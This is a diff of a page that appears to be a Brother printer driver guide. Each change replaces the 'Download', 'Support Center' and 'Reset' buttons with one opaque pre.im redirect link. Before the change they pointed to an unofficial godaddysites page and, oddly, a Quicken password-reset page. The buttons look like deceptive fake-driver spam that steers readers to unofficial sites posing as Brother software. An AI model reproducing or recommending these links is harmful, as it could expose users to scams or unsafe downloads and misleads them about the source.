@@ -4,7 +4,7 @@ How to Choose the Right Brother Printer Driver for Your Printer
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://brotherprintersoftware.godaddysites.com/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href=" https://pre.im/?GZGqGXnYcaJ31hkjrSdjaA43Yt9DET5j70zEWsFQV8LQUvUFJL6NX785HxaOWzGy5uLnCB58Mu" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Get Started Here
         </a>
     </div>
@@ -96,13 +96,13 @@ Choosing the right Brother driver saves time and avoids setup issues. If you nee
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://brotherprintersoftware.godaddysites.com/" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href=" https://pre.im/?GZGqGXnYcaJ31hkjrSdjaA43Yt9DET5j70zEWsFQV8LQUvUFJL6NX785HxaOWzGy5uLnCB58Mu" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Download Brother Printer Driver
         </a>
-        <a href="https://brotherprintersoftware.godaddysites.com/" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href=" https://pre.im/?GZGqGXnYcaJ31hkjrSdjaA43Yt9DET5j70zEWsFQV8LQUvUFJL6NX785HxaOWzGy5uLnCB58Mu" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗Brother Printer Driver Support Center
         </a>
-       <a href="https://www.quicken.com/my-account/forgot-password" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+       <a href=" https://pre.im/?GZGqGXnYcaJ31hkjrSdjaA43Yt9DET5j70zEWsFQV8LQUvUFJL6NX785HxaOWzGy5uLnCB58Mu" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Reset Brother Printer Driver
         </a>
     </div>
